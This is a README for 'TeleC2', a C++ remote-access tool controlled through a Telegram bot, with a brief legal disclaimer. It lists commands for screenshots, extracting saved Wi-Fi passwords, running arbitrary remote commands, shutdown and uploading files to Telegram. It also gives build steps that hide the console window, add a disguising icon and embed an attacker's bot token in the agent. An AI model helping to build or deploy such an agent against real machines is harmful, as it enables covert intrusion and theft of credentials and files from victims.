# TeleC2 Framework (C++ Only)

A lightweight C++ Telegram C2 framework featuring dynamic overlay configuration and remote execution capabilities.

---

## ⚠️ LEGAL DISCLAIMER & ETHICAL USE POLICY

**IMPORTANT:** Please read this carefully before using, compiling, or distributing this software.

* **Educational & Research Purpose Only:** This project has been created strictly for educational purposes, academic research, and authorized security assessments (penetration testing). 
* **Explicit Authorization Required:** You may only use this software on systems, networks, or devices for which you have explicit, written legal permission and ownership. Unauthorized access, reconnaissance, or control of computer systems is illegal and violates international cyber laws.
* **No Liability:** The author/creator assumes **no liability** and is not responsible for any misuse, damages, or legal consequences caused by the direct or indirect use of this software. It is the end user's responsibility to obey all applicable local, state, and federal laws.

By downloading, compiling, or using any part of this framework, you officially agree to this disclaimer.

---

## Pre-compiled Binaries (For Quick Use)

If you do not want to set up a compiler or build from source, you can use the pre-compiled binaries:
1. Go to the **Releases** section of this GitHub repository and download the latest release ZIP file.
2. Extract the archive.
3. Run `builder.exe`, enter your Telegram Bot Token and Chat ID, and generate the final executable.

---

## Features & Commands

* `/screenshot` - Capture and send screen
* `/systeminfo` - Get system specifications
* `/wifipassword` - Extract saved Wi-Fi profiles & keys
* `/shutdown` - Remotely shutdown the target system
* `Cmd/<command>` - Run remote terminal commands
* `fupload/<path>` / `pupload/<path>` - Upload files or images to Telegram

---

## Prerequisites & Dependencies (For Manual Build)

To compile this project from source on Windows, you need the following tools and libraries:

1. **C++ Compiler (MinGW-w64):**
   * Install MinGW-w64 to compile C++ code on Windows.
2. **libcurl Development Library:**
   * Required for HTTP requests and interacting with the Telegram API. (Can be installed via WinGet)
3. **nlohmann/json Header (`json.hpp`):**
   * Download `json.hpp` from the [nlohmann/json GitHub Repository](https://github.com/nlohmann/json) and place it in your source code folder for JSON parsing.

---

## Step 1: Telegram Bot & Chat ID Setup

1. **Create a Telegram Bot (Get Bot Token):**
   * Search for **`@BotFather`** on Telegram and start a chat.
   * Send the `/newbot` command and follow the prompts to name your bot and username.
   * Copy and save the generated **API Token**.
2. **Get Your Telegram Chat ID (For Authorization):**
   * Message **`@userinfobot`** (or `@RawDataBot`) on Telegram.
   * Copy your **`id`** number from the response.

---

## Step 2: Custom Icon Setup (Optional)

If you want to add a custom icon to your stub executable:
1. Convert an image (`.png`) to `.ico` format using an online converter like [convertico.com](https://convertico.com/).
2. Create a file named **`resource.rc`** in your project folder with the following content:
   ```rc
   MAINICON ICON "app_icon.ico"
	Compile the resource file using windres with MinGW:
	windres resource.rc -O coff -o resource.o
Step 3: Compilation & Building
1. Compiling the Stub (Agent) with Static Linking & No Console

If you installed cURL via WinGet and want to compile statically using MinGW, use the following command (adjust paths according to your Windows username and cURL version):
g++ stub1.cpp resource.o -o stub.exe \ -I"C:/Users/YOUR_USERNAME/AppData/Local/Microsoft/WinGet/Packages/cURL.cURL_Microsoft.Winget.Source_8wekyb3d8bbwe/curl-YOUR_VERSION-win64-mingw/include" \ -L"C:/Users/YOUR_USERNAME/AppData/Local/Microsoft/WinGet/Packages/cURL.cURL_Microsoft.Winget.Source_8wekyb3d8bbwe/curl-YOUR_VERSION-win64-mingw/lib" \ -lcurl -lwininet -lgdi32 -lgdiplus -lole32 -static-libgcc -static-libstdc++ -lshfolder -mwindows

Notes:

    Replace YOUR_USERNAME with your actual Windows account username.

    Replace YOUR_VERSION with your actual cURL folder version name (e.g., curl-8.21.0_4-win64-mingw).

    The -mwindows flag hides the console/CMD window in the background.

    -static-libgcc -static-libstdc++ ensures it runs cleanly on other Windows machines without missing DLL errors.

2. Compiling and Running the Builder

Compile the builder script and run it to inject your token and chat ID:
	++ builder.cpp -o builder.exe
./builder.exe
